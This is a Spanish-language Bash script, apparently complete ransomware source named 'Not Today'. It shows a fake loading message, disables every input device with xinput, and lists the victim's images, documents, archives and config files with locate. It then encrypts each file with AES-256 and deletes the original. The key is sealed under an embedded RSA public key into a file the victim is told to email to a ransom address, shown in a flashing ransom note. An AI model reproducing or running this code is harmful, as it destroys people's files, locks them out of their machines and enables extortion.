#!/bin/bash

#TextoFalso
echo "Cargando los ficheros de configuracion ...."
#Actualizando la db
updatedb
#Desactiva todo para que no pueda moverse el usuario
disp=`xinput list --id-only`; for i in $disp; do xinput disable $i; done

#Saludo
echo 'clear' > saludo.sh
echo 'echo -e "\033[1;31m\033[5m ███▄    █  ▒█████  ▄▄▄█████▓ ▒█████  ▓█████▄  ▄▄▄     ▓██   ██▓"' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo " ██ ▀█   █ ▒██▒  ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▀ ██▌▒████▄    ▒██  ██▒"' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "▓██  ▀█ ██▒▒██░  ██▒▒ ▓██░ ▒░▒██░  ██▒░██   █▌▒██  ▀█▄   ▒██ ██░"' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "▓██▒  ▐▌██▒▒██   ██░░ ▓██▓ ░ ▒██   ██░░▓█▄   ▌░██▄▄▄▄██  ░ ▐██▓░"' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "▒██░   ▓██░░ ████▓▒░  ▒██▒ ░ ░ ████▓▒░░▒████▓  ▓█   ▓██▒ ░ ██▒▓░"' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "░ ▒░   ▒ ▒ ░ ▒░▒░▒░   ▒ ░░   ░ ▒░▒░▒░  ▒▒▓  ▒  ▒▒   ▓▒█░  ██▒▒▒ "' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "░ ░░   ░ ▒░  ░ ▒ ▒░     ░      ░ ▒ ▒░  ░ ▒  ▒   ▒   ▒▒ ░▓██ ░▒░ "' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "   ░   ░ ░ ░ ░ ░ ▒    ░      ░ ░ ░ ▒   ░ ░  ░   ░   ▒   ▒ ▒ ░░  "' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "         ░     ░ ░               ░ ░     ░          ░  ░░ ░     "' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo "                                       ░                ░ ░     "' >> saludo.sh
echo 'sleep 0.2' >> saludo.sh
echo 'echo -e "\033[0m\033[1;33m"' >> saludo.sh
echo 'mensaje="Hola, esto_puede_parecerte_una_broma_pero_no_lo_es,_has_sido_infectado_por_un_ransomware_llamado_Not_Today,_en_este_momento_tus_archivos_estan_siendo_encriptados_así_que_ten_cuidado_de_que_apagues_el_computador_porque_no_podrás_recuperar_tus_archivos._No_deseamos_que_pierdas_tus_documentos,_ni_nos_interesa_el_dinero,_solo_queremos_jugar_un_poco._Así_que_si_sigues_los_pasos_de_manera_correcta_todo_volverá_a_la_normalidad._Se_creará_un_documento_en_la_ruta_/ruta/ruta/ruta/enviame.enc_la_cual_deverás_enviar_al_correo_revison@ransom.org_donde_te_responderemos_con_un_reto_el_cual_si_lo_respondes_de_manera_correcta_te_enviaremos_dos_archivos_para_que_recuperes_todos_tus_documentos._Adios,_y_buena_suerte."' >> saludo.sh
echo '' >> saludo.sh
echo 'L=`echo ${#mensaje}`' >> saludo.sh
echo 'for i in `seq 0 $L`;' >> saludo.sh
echo 'do' >> saludo.sh
echo '	echo -n ${mensaje:i:1}' >> saludo.sh
echo '	sleep 0.1' >> saludo.sh
echo 'done' >> saludo.sh
echo '' >> saludo.sh
echo 'echo ""' >> saludo.sh
echo 'sh' >> saludo.sh

gnome-terminal -- bash saludo.sh&

#Uso para distros con xterm
#DSK=`env | grep _DESKTOP_SESSION_ID | cut -d "_" -f 1 | tr [:upper:] [:lower:]`
#xterm -geometry 700x500 -fa 'Monospace' -fs 14 -T "Cuidado hijo" -e bash saludo.sh&

#Clave Publica
echo "-----BEGIN PUBLIC KEY-----" >> clave.pub.pem
echo "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2iM7qHGt9FQL1HeYldsE" >> clave.pub.pem
echo "nwfmAhlc3bfmRaxVA07YrjdCVTXyhjKq5cn8iE8nDWUDwbrZKnLIe63G7LpT6L8l" >> clave.pub.pem
echo "oqCgHieEPR3ZqXzuLjr0ZCkU9cFE8E1oJV7bfLEotH5iZpeuY06C1GwWi9+Kdrf9" >> clave.pub.pem
echo "R0J3dplb1BIxrsAxdiq+nUHVAeUIpDefvadJsK9pjUpfvsUH7O214S8CAzH1irxY" >> clave.pub.pem
echo "ejQlqrGdWXlzbeTzlm+BRl9VoxL04lioKDjw5c0dpYrP/MFysZqyzZdp3ctLwRYN" >> clave.pub.pem
echo "818+heHgGYoakWTUOqlhQXZh+O6mecya5j6BaxcXSL7IacQc5+Q9GKzlm7FlNpga" >> clave.pub.pem
echo "PQHKbaSbEifpCI6Ix4p/l44ZJTpq9VkrUrZNDbSsUFCIaVaFkXtGzrFcZLVusLaq" >> clave.pub.pem
echo "+Y9TUF1uKzK4UxAC+hU92O+ZxVhGTg1Z99Bj4vbKvDCr1YHRJeiziwwehb4i0xia" >> clave.pub.pem
echo "K8ft35krQl+Slkt57MuWrefdbtD0qvvw0u6H+6thtGZv2c4vg+MSK2pddPWC8IPi" >> clave.pub.pem
echo "kSHJOxR9B3Tmw9cOBhMvKoUSHHl4Rfznw7t4hzk2FL/HTpee4vP626CVLqDycYBe" >> clave.pub.pem
echo "yMo9tDSCJzE13yydTPNS5SzmavNTlAoM6VKJ8W7eqXloJ7TGTtJejzSJDGA21dGx" >> clave.pub.pem
echo "8CPFuYvv302VnB7d/urDbH8CAwEAAQ==">> clave.pub.pem
echo "-----END PUBLIC KEY-----" >> clave.pub.pem

#Generando la key1
PASS=`openssl rand -base64 48`

#Generar los archivos a encriptar
locate -r "\.jpg$" > /tmp/list.ntm
locate -r "\.jpeg$" >> /tmp/list.ntm
locate -r "\.png$" >> /tmp/list.ntm
locate -r "\.pdf$" >> /tmp/list.ntm
locate -r "\.odt$" >> /tmp/list.ntm
locate -r "\.rar$" >> /tmp/list.ntm
locate -r "\.zip$" >> /tmp/list.ntm
locate -r "\.txt$" >> /tmp/list.ntm
locate -r "\.conf$" >> /tmp/list.ntm



for FILE in `cat /tmp/list.ntm`
do
	#Encriptando archivo y Eliminando el archivo anterior
	(openssl enc -aes-256-cbc -pass pass:$PASS -in $FILE -out $FILE.ntd; rm $FILE)&
done



#Ocultando la key1
echo $PASS > /tmp/t.ps

openssl rsautl -encrypt -in /tmp/t.ps -out enviame.enc -inkey clave.pub.pem -pubin

rm /tmp/t.ps

#Eliminando la clave
rm clave.pub.pem
